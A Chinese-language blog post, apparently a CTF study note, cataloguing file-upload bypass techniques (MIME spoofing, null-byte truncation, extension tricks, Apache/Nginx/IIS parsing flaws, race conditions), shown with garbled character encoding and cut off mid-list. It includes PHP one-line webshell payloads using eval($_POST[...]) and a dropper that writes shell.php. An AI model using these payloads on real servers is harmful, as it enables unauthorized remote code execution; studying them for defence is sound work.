<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"chensonghi.github.io.","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","Sidebar Display (only for Muse | Mist), available values":["always  expand for all pages automatically."],"display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="å‰ç«¯ç»•è¿‡æ­£å¸¸ä¸Šä¼ æ–‡ä»¶,æ‰å–æ•°æ®åŒ…ä¿®æ”¹ï¼ˆbpæŠ“åŒ…æ”¹åç¼€ï¼‰ åç«¯ç»•è¿‡æœåŠ¡å™¨ç«¯æ£€æµ‹çš„ç»•è¿‡ å‡½æ•°ç‰¹æ€§move_uploaded_fileå‡½æ•°ä¼šè‡ªåŠ¨å»é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ å’Œ &#x2F;. fopenå‡½æ•°ç‰¹æ€§ 123456789&lt;?php$filename&#x3D;&amp;#x27;1.php&#x2F;.&amp;#x27;;$content&#x3D;&quot;&lt;?php eval($_POST[1]);?&gt;&quot;;$f">
<meta property="og:type" content="article">
<meta property="og:title" content="æ–‡ä»¶ä¸Šä¼ ">
<meta property="og:url" content="https://chensonghi.github.io./2023/10/10/file_upload/index.html">
<meta property="og:site_name" content="æ˜Ÿæ²³é£">
<meta property="og:description" content="å‰ç«¯ç»•è¿‡æ­£å¸¸ä¸Šä¼ æ–‡ä»¶,æ‰å–æ•°æ®åŒ…ä¿®æ”¹ï¼ˆbpæŠ“åŒ…æ”¹åç¼€ï¼‰ åç«¯ç»•è¿‡æœåŠ¡å™¨ç«¯æ£€æµ‹çš„ç»•è¿‡ å‡½æ•°ç‰¹æ€§move_uploaded_fileå‡½æ•°ä¼šè‡ªåŠ¨å»é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ å’Œ &#x2F;. fopenå‡½æ•°ç‰¹æ€§ 123456789&lt;?php$filename&#x3D;&amp;#x27;1.php&#x2F;.&amp;#x27;;$content&#x3D;&quot;&lt;?php eval($_POST[1]);?&gt;&quot;;$f">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2023-10-10T10:38:57.000Z">
<meta property="article:modified_time" content="2024-02-04T16:58:18.034Z">
<meta property="article:author" content="chleynx">
<meta property="article:tag" content="2023 upload">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://chensonghi.github.io./2023/10/10/file_upload/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>æ–‡ä»¶ä¸Šä¼  | æ˜Ÿæ²³é£</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ ">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">æ˜Ÿæ²³é£</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>å…³äº</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>æ ‡ç­¾</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>åˆ†ç±»</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a>

  </li>
        <li class="menu-item menu-item-schedule">

    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>æ—¥ç¨‹è¡¨</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2023/10/10/file_upload/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ch.jpg">
      <meta itemprop="name" content="chleynx">
      <meta itemprop="description" content="ä¸æ˜¯çœ‹åˆ°å¸Œæœ›æ‰åšæŒï¼Œè€Œæ˜¯åšæŒäº†æ‰èƒ½çœ‹åˆ°å¸Œæœ›">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="æ˜Ÿæ²³é£">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          æ–‡ä»¶ä¸Šä¼ 
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>

              <time title="åˆ›å»ºæ—¶é—´ï¼š2023-10-10 18:38:57" itemprop="dateCreated datePublished" datetime="2023-10-10T18:38:57+08:00">2023-10-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">æ›´æ–°äº</span>
                <time title="ä¿®æ”¹æ—¶é—´ï¼š2024-02-05 00:58:18" itemprop="dateModified" datetime="2024-02-05T00:58:18+08:00">2024-02-05</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Summar/" itemprop="url" rel="index"><span itemprop="name">Summar</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="é˜…è¯»æ¬¡æ•°" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">é˜…è¯»æ¬¡æ•°ï¼š</span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="å‰ç«¯ç»•è¿‡"><a href="#å‰ç«¯ç»•è¿‡" class="headerlink" title="å‰ç«¯ç»•è¿‡"></a>å‰ç«¯ç»•è¿‡</h1><p>æ­£å¸¸ä¸Šä¼ æ–‡ä»¶,æ‰å–æ•°æ®åŒ…ä¿®æ”¹ï¼ˆbpæŠ“åŒ…æ”¹åç¼€ï¼‰</p>
<h1 id="åç«¯ç»•è¿‡"><a href="#åç«¯ç»•è¿‡" class="headerlink" title="åç«¯ç»•è¿‡"></a>åç«¯ç»•è¿‡</h1><p>æœåŠ¡å™¨ç«¯æ£€æµ‹çš„ç»•è¿‡</p>
<h2 id="å‡½æ•°ç‰¹æ€§"><a href="#å‡½æ•°ç‰¹æ€§" class="headerlink" title="å‡½æ•°ç‰¹æ€§"></a>å‡½æ•°ç‰¹æ€§</h2><p>move_uploaded_fileå‡½æ•°ä¼šè‡ªåŠ¨å»é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ å’Œ &#x2F;.</p>
<p><code>fopen</code>å‡½æ•°ç‰¹æ€§</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$filename=&#x27;1.php/.&#x27;;</span><br><span class="line">$content=&quot;&lt;?php eval($_POST[1]);?&gt;&quot;;</span><br><span class="line">$f = fopen($filename, &#x27;w&#x27;);</span><br><span class="line">    fwrite($f, $content);</span><br><span class="line">    fclose($f);    </span><br><span class="line">?&gt; </span><br><span class="line">#ä¼šåœ¨å½“å‰ç›®å½•ç”Ÿæˆ1.php,æ–‡ä»¶åä¸º1.php.ä¹Ÿå¯ä»¥</span><br><span class="line">â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</span><br></pre></td></tr></table></figure>

<h5 id="å…¶å®ƒ"><a href="#å…¶å®ƒ" class="headerlink" title="å…¶å®ƒ"></a>å…¶å®ƒ</h5><p>åç¼€åå¤§å°å†™</p>
<p>åç¼€ååŒå†™</p>
<p><code>å°è¯•php3 phtml php3457(linux+apache+php5.6)ç­‰åç¼€</code></p>
<p>æ£€æµ‹MIMEç±»å‹çš„,æ‰åŒ…æ”¹MIMEç±»å‹</p>
<h3 id="æœåŠ¡ç«¯æ£€æµ‹ï¼ˆMINEç±»å‹æ£€æµ‹ï¼‰"><a href="#æœåŠ¡ç«¯æ£€æµ‹ï¼ˆMINEç±»å‹æ£€æµ‹ï¼‰" class="headerlink" title="æœåŠ¡ç«¯æ£€æµ‹ï¼ˆMINEç±»å‹æ£€æµ‹ï¼‰ #"></a>æœåŠ¡ç«¯æ£€æµ‹ï¼ˆMINEç±»å‹æ£€æµ‹ï¼‰ <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A3%80%E6%B5%8B-mine%E7%B1%BB%E5%9E%8B%E6%A3%80%E6%B5%8B">#</a></h3><blockquote>
<p>MIME (Multipurpose Internet Mail Extensions) æ˜¯æè¿°æ¶ˆæ¯å†…å®¹ç±»å‹çš„å› ç‰¹ç½‘æ ‡å‡†ã€‚</p>
</blockquote>
<p>æœåŠ¡å™¨ä»£ç åˆ¤æ–­$_FILES[â€fileâ€œ][â€œtypeâ€]æ˜¯ä¸æ˜¯å›¾ç‰‡æ ¼å¼ï¼ˆ<code>image/jpeg</code>ã€<code>image/png</code>ã€<code>image/gif</code>ï¼‰ï¼Œå¦‚æœä¸æ˜¯ï¼Œåˆ™ä¸å…è®¸ä¸Šä¼ è¯¥æ–‡ä»¶ã€‚</p>
<p>ç»•è¿‡æ–¹æ³•ï¼š</p>
<blockquote>
<p>æŠ“åŒ…åæ›´æ”¹Content-Typeä¸ºå…è®¸çš„ç±»å‹ç»•è¿‡è¯¥ä»£ç é™åˆ¶ï¼Œæ¯”å¦‚å°†phpæ–‡ä»¶çš„<code>Content-Type:application/octet-stream</code>ä¿®æ”¹ä¸º<code>image/jpeg</code>ã€<code>image/png</code>ã€<code>image/gif</code>ç­‰å°±å¯ä»¥</p>
</blockquote>
<p>å¸¸è§MIMETYPE</p>
<blockquote>
<p>audio&#x2F;mpeg -&gt; .mp3 application&#x2F;msword -&gt; .doc application&#x2F;octet-stream -&gt; .exe application&#x2F;pdf -&gt; .pdf application&#x2F;x-javascript -&gt; .js application&#x2F;x-rar -&gt; .rar application&#x2F;zip -&gt; .zip image&#x2F;gif -&gt; .gif image&#x2F;jpeg -&gt; .jpg &#x2F; .jpeg image&#x2F;png -&gt; .png text&#x2F;plain -&gt; .txt text&#x2F;html -&gt; .html video&#x2F;mp4 -&gt; .mp4</p>
</blockquote>
<h3 id="æœåŠ¡ç«¯æ£€æµ‹ï¼ˆç›®å½•è·¯å¾„æ£€æµ‹ï¼‰"><a href="#æœåŠ¡ç«¯æ£€æµ‹ï¼ˆç›®å½•è·¯å¾„æ£€æµ‹ï¼‰" class="headerlink" title="æœåŠ¡ç«¯æ£€æµ‹ï¼ˆç›®å½•è·¯å¾„æ£€æµ‹ï¼‰ #"></a>æœåŠ¡ç«¯æ£€æµ‹ï¼ˆç›®å½•è·¯å¾„æ£€æµ‹ï¼‰ <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A3%80%E6%B5%8B-%E7%9B%AE%E5%BD%95%E8%B7%AF%E5%BE%84%E6%A3%80%E6%B5%8B">#</a></h3><p>å¯¹ç›®å½•è·¯å¾„çš„æ£€æµ‹ä¸å¤Ÿä¸¥è°¨è€Œå¯¼è‡´å¯ä»¥ä½¿ç”¨%00æˆªæ–­ç»•è¿‡è¿›è¡Œæ”»å‡»ã€‚</p>
<p>ç»•è¿‡æ–¹æ³•:</p>
<blockquote>
<ul>
<li>ä¾‹å¦‚ï¼š&#x2F;111.php%00.gif&#x2F;111.gif -&gt; &#x2F;111.php</li>
</ul>
</blockquote>
<h3 id="æœåŠ¡ç«¯æ£€æµ‹ï¼ˆæ–‡ä»¶æ‰©å±•åæ£€æµ‹ï¼‰"><a href="#æœåŠ¡ç«¯æ£€æµ‹ï¼ˆæ–‡ä»¶æ‰©å±•åæ£€æµ‹ï¼‰" class="headerlink" title="æœåŠ¡ç«¯æ£€æµ‹ï¼ˆæ–‡ä»¶æ‰©å±•åæ£€æµ‹ï¼‰ #"></a>æœåŠ¡ç«¯æ£€æµ‹ï¼ˆæ–‡ä»¶æ‰©å±•åæ£€æµ‹ï¼‰ <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A3%80%E6%B5%8B-%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%90%8D%E6%A3%80%E6%B5%8B">#</a></h3><p>ç»•è¿‡æ–¹æ³•ï¼š</p>
<blockquote>
<ul>
<li>æ–‡ä»¶åå¤§å°å†™ç»•è¿‡ï¼Œå¦‚ï¼š<code>*.pHp</code> <code>*.aSP</code></li>
<li>æ–‡ä»¶ååŒå†™ç»•è¿‡ï¼Œå¦‚ï¼š<code>*.pphphp</code></li>
<li>Unicodeï¼š å½“ç›®æ ‡å­˜åœ¨json_decodeä¸”æ£€æŸ¥åœ¨json_decodeä¹‹å‰,å¯ä»¥å°†phpå†™ä¸º<code>\u0070hp</code></li>
<li>åå•åˆ—è¡¨ç»•è¿‡ï¼Œå¦‚ï¼š<code>*.asa</code> <code>*.cer</code></li>
<li>ç‰¹æ®Šæ–‡ä»¶åç»•è¿‡ï¼Œæ¯”å¦‚windowsæ–‡ä»¶åæœ€åä¸èƒ½æœ‰.æˆ–ç©ºæ ¼ï¼Œå¯è®¾ä¸º<code>*.php.</code>æˆ–<code>*.php+</code></li>
<li>0x00æˆªæ–­ç»•è¿‡ï¼Œæ¯”å¦‚ï¼š<code>*.php(0x00).jpg</code> æˆ– <code>*.php%00.jpg</code></li>
<li>æ–‡ä»¶åŒ…å«æ¼æ´</li>
<li>æœåŠ¡å™¨è§£ææ¼æ´</li>
<li>.htaccessæ–‡ä»¶æ”»å‡»</li>
</ul>
</blockquote>
<h3 id="æ–‡ä»¶æˆªæ–­ç»•è¿‡æ”»å‡»"><a href="#æ–‡ä»¶æˆªæ–­ç»•è¿‡æ”»å‡»" class="headerlink" title="æ–‡ä»¶æˆªæ–­ç»•è¿‡æ”»å‡» #"></a>æ–‡ä»¶æˆªæ–­ç»•è¿‡æ”»å‡» <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%96%87%E4%BB%B6%E6%88%AA%E6%96%AD%E7%BB%95%E8%BF%87%E6%94%BB%E5%87%BB">#</a></h3><blockquote>
<p>æˆªæ–­ç±»å‹ï¼šPHP%00æˆªæ–­</p>
<p>æˆªæ–­åŸç†ï¼šç”±äº00ä»£è¡¨ç»“æŸç¬¦ï¼Œæ‰€ä»¥ä¼šæŠŠ00åé¢çš„æ‰€æœ‰å­—ç¬¦åˆ é™¤</p>
<p>æˆªæ–­æ¡ä»¶ï¼šPHPç‰ˆæœ¬å°äº5.3.4ï¼ŒPHPçš„magic_quotes_gpcä¸ºOFFçŠ¶æ€</p>
</blockquote>
<p>ç»•è¿‡æ–¹æ³•ï¼š</p>
<blockquote>
<ul>
<li>ä¾‹å¦‚ä¸Šä¼ æ–‡ä»¶shell.phpï¼Œä¸Šä¼ æ–‡ä»¶è·¯å¾„ä¸º&#x2F;?upload&#x3D;shell.php</li>
<li>ç»•è¿‡ï¼š&#x2F;?upload&#x3D;shell.php%00.jpg -&gt; &#x2F;?upload&#x3D;shell.php</li>
</ul>
</blockquote>
<h3 id="è§£ææ¼æ´æ”»å‡»"><a href="#è§£ææ¼æ´æ”»å‡»" class="headerlink" title="è§£ææ¼æ´æ”»å‡» #"></a>è§£ææ¼æ´æ”»å‡» <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB">#</a></h3><p>ä¸»è¦æœ‰ç›®å½•è§£æã€æ–‡ä»¶è§£æï¼ŒApacheè§£ææ¼æ´ã€Nginxè§£ææ¼æ´ã€IIS7.5è§£ææ¼æ´ã€‚</p>
<h4 id="ç›®å½•è§£æ"><a href="#ç›®å½•è§£æ" class="headerlink" title="ç›®å½•è§£æ #"></a>ç›®å½•è§£æ <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E7%9B%AE%E5%BD%95%E8%A7%A3%E6%9E%90">#</a></h4><blockquote>
<ul>
<li>å½¢å¼ï¼š<code>www.xxx.com/xxx.asp/xxx.jpg</code></li>
<li>åŸç†ï¼šæœåŠ¡å™¨ä¼šé»˜è®¤æŠŠ <code>.asp</code> å’Œ <code>.asp</code>ç›®å½•ä¸‹çš„æ–‡ä»¶éƒ½è§£ææˆaspæ–‡ä»¶</li>
</ul>
</blockquote>
<h4 id="æ–‡ä»¶è§£æ"><a href="#æ–‡ä»¶è§£æ" class="headerlink" title="æ–‡ä»¶è§£æ #"></a>æ–‡ä»¶è§£æ <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90">#</a></h4><blockquote>
<ul>
<li>å½¢å¼ï¼š<code>www.xxx.com/xxx.asp;.jpg</code></li>
<li>åŸç†ï¼šæœåŠ¡å™¨é»˜è®¤ä¸è§£æ<code>;</code>åé¢çš„å†…å®¹ï¼Œå› æ­¤<code>xxx.asp;jpg</code>è¢«è§£æä¸º<code>xxx.asp</code>æ–‡ä»¶äº†</li>
</ul>
</blockquote>
<h4 id="Apacheè§£ææ¼æ´"><a href="#Apacheè§£ææ¼æ´" class="headerlink" title="Apacheè§£ææ¼æ´ #"></a>Apacheè§£ææ¼æ´ <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E">#</a></h4><p>æœåŠ¡å™¨ä»£ç ä¸­é™åˆ¶äº†æŸäº›åç¼€çš„æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œä½†æ˜¯æœ‰äº›Apacheæ˜¯å…è®¸è§£æå…¶å®ƒåç¼€çš„ï¼Œä¾‹å¦‚åœ¨httpd.confä¸­å¦‚æœé…ç½®æœ‰å¦‚ä¸‹ä»£ç ï¼Œåˆ™èƒ½å¤Ÿè§£æphpå’Œphtmlæ–‡ä»¶</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml</span><br></pre></td></tr></table></figure>

<p>1</p>
<p>å¸¸ç”¨åç¼€ï¼š<code>*.php</code> <code>*.php3</code> <code>*.php4</code> <code>*.php5</code> <code>*.phtml</code> <code>*.pht</code></p>
<p>åœ¨Apacheçš„è§£æé¡ºåºä¸­ï¼Œæ˜¯ä»å³åˆ°å·¦å¼€å§‹è§£ææ–‡ä»¶åç¼€çš„ï¼Œå¦‚æœæœ€å³ä¾§çš„æ‰©å±•åä¸å¯è¯†åˆ«ï¼Œå°±ç»§ç»­å¾€å·¦åˆ¤æ–­ï¼Œç›´åˆ°é‡åˆ°å¯ä»¥è§£æçš„æ–‡ä»¶åç¼€ä¸ºæ­¢ã€‚å› æ­¤ï¼Œä¾‹å¦‚ä¸Šä¼ çš„æ–‡ä»¶åä¸º1.php.xxxxï¼Œå› ä¸ºåç¼€xxxxä¸å¯è§£æï¼Œæ‰€ä»¥å‘å·¦è§£æåç¼€phpã€‚</p>
<blockquote>
<ul>
<li>ä¾‹å¦‚ï¼š<code>shell.php.qwe.asd</code> -&gt;<code>shell.php</code></li>
</ul>
</blockquote>
<h4 id="Nginxè§£ææ¼æ´"><a href="#Nginxè§£ææ¼æ´" class="headerlink" title="Nginxè§£ææ¼æ´ #"></a>Nginxè§£ææ¼æ´ <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E">#</a></h4><blockquote>
<p>Nginxé»˜è®¤æ˜¯ä»¥CGIçš„æ–¹å¼æ”¯æŒPHPè§£æçš„ï¼Œæ™®éçš„åšæ³•æ˜¯åœ¨Nginxé…ç½®æ–‡ä»¶ä¸­é€šè¿‡ æ­£åˆ™åŒ¹é…è®¾ç½®<strong>SCRIPT_FILENAME</strong>ã€‚å½“è®¿é—®<code>www.xxx.com/phpinfo.jpg/1.php</code>è¿™ä¸ª URLæ—¶ï¼Œ$fastcgi_script_nameä¼šè¢«è®¾ç½®ä¸ºâ€œphpinfo.jpg&#x2F;1.phpâ€ï¼Œç„¶åæ„é€ æˆ SCRIPT_FILENAMEä¼ é€’ç»™PHP CGIã€‚</p>
<p>åŸå› æ˜¯å¼€å¯äº† fix_pathinfo è¿™ä¸ªé€‰é¡¹ï¼Œä¼šè§¦å‘ åœ¨PHPä¸­çš„å¦‚ä¸‹é€»è¾‘ï¼š PHPä¼šè®¤ä¸ºSCRIPT_FILENAMEæ˜¯phpinfo.jpgï¼Œè€Œ1.phpæ˜¯PATH_INFOï¼Œæ‰€ä»¥å°±ä¼š å°†phpinfo.jpgä½œä¸ºPHPæ–‡ä»¶æ¥è§£æäº†ã€‚</p>
</blockquote>
<p>æ”»å‡»æ–¹å¼</p>
<blockquote>
<ul>
<li>å½¢å¼ï¼š <code>www.xxxx.com/UploadFiles/image/1.jpg/1.php</code> <code>www.xxxx.com/UploadFiles/image/1.jpg%00.php</code> <code>www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php</code></li>
<li>å¦ä¸€ç§æ–¹æ³•ï¼šä¸Šä¼ ä¸€ä¸ªåå­—ä¸ºtest.jpgï¼Œç„¶åè®¿é—®<code>test.jpg/.php</code>,åœ¨è¿™ä¸ªç›®å½•ä¸‹å°±ä¼šç”Ÿæˆä¸€å¥è¯æœ¨é©¬shell.phpã€‚</li>
</ul>
</blockquote>
<h4 id="IIS7-5è§£ææ¼æ´"><a href="#IIS7-5è§£ææ¼æ´" class="headerlink" title="IIS7.5è§£ææ¼æ´ #"></a>IIS7.5è§£ææ¼æ´ <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#iis7-5%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E">#</a></h4><blockquote>
<p>IIS7.5çš„æ¼æ´ä¸nginxçš„ç±»ä¼¼ï¼Œéƒ½æ˜¯ç”±äºphpé…ç½®æ–‡ä»¶ä¸­ï¼Œå¼€å¯äº† <strong>cgi.fix_pathinfo</strong>ï¼Œè€Œè¿™å¹¶ä¸æ˜¯nginxæˆ–è€…iis7.5æœ¬èº«çš„æ¼æ´ã€‚</p>
</blockquote>
<h3 id="ç«äº‰æ¡ä»¶æ”»å‡»"><a href="#ç«äº‰æ¡ä»¶æ”»å‡»" class="headerlink" title="ç«äº‰æ¡ä»¶æ”»å‡» #"></a>ç«äº‰æ¡ä»¶æ”»å‡» <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E7%AB%9E%E4%BA%89%E6%9D%A1%E4%BB%B6%E6%94%BB%E5%87%BB">#</a></h3><p>ä¸€äº›ç½‘ç«™ä¸Šä¼ æ–‡ä»¶çš„é€»è¾‘æ—¶å…ˆå…è®¸ä¸Šä¼ ä»»æ„æ–‡ä»¶ï¼Œç„¶åæ£€æŸ¥ä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶æ˜¯å¦åŒ…å«WebShellè„šæœ¬ï¼Œå¦‚æœåŒ…å«åˆ™åˆ é™¤è¯¥æ–‡ä»¶ã€‚è¿™é‡Œå­˜åœ¨çš„é—®é¢˜æ˜¯æ–‡ä»¶ä¸Šä¼ æˆåŠŸåå’Œåˆ é™¤æ–‡ä»¶ä¹‹é—´å­˜åœ¨ä¸€ä¸ªçŸ­æš‚çš„æ—¶é—´å·®ï¼ˆå› ä¸ºéœ€è¦æ‰§è¡Œæ£€æŸ¥æ–‡ä»¶å’Œåˆ é™¤æ–‡ä»¶çš„æ“ä½œï¼‰ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ—¶é—´å·®å®Œæˆç«äº‰æ¡ä»¶çš„ä¸Šä¼ æ¼æ´æ”»å‡»ã€‚</p>
<p>æ”»å‡»æ–¹æ³•ï¼š</p>
<blockquote>
<ul>
<li>æ”»å‡»è€…éœ€è¦å…ˆä¸Šä¼ ä¸€ä¸ªWebShellè„šæœ¬1.phpï¼Œ1.phpçš„å†…å®¹ä¸ºç”Ÿæˆä¸€ä¸ªæ–°çš„WebShellè„šæœ¬shell.phpï¼Œ1.phpå†™å…¥å¦‚ä¸‹ä»£ç </li>
</ul>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	fputs(fopen(&quot;../shell.php&quot;, &quot;w&quot;),&#x27;&lt;?php @eval($_POST[&#x27;cmd&#x27;]); ?&gt;&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<ul>
<li>å½“1.phpä¸Šä¼ å®Œæˆåï¼Œå®¢æˆ·ç«¯ç«‹å³è®¿é—®1.phpï¼Œåˆ™ä¼šåœ¨æœåŠ¡ç«¯å½“å‰ç›®å½•ä¸‹è‡ªåŠ¨ç”Ÿæˆshell.phpï¼Œè¿™æ—¶æ”»å‡»è€…å°±åˆ©ç”¨äº†æ—¶é—´å·®å®Œæˆäº†WebShellçš„ä¸Šä¼ </li>
</ul>
</blockquote>
<h3 id="åŒæ–‡ä»¶ä¸Šä¼ "><a href="#åŒæ–‡ä»¶ä¸Šä¼ " class="headerlink" title="åŒæ–‡ä»¶ä¸Šä¼  #"></a>åŒæ–‡ä»¶ä¸Šä¼  <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/uploadfile.html#%E5%8F%8C%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">#</a></h3><p>æœ¬æ„ä¸ºä¸Šä¼ ä¸¤ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶å»çªç ´ã€‚ä¸Šä¼ ç‚¹æ”¯æŒå¤šæ–‡ä»¶ä¸Šä¼ ï¼Œä½†æ˜¯å´åªå¯¹ç¬¬ä¸€ä¸ªæ–‡ä»¶åšäº†è¿‡æ»¤ã€‚</p>
<p>åˆ©ç”¨æ–¹å¼ï¼š</p>
<blockquote>
<ul>
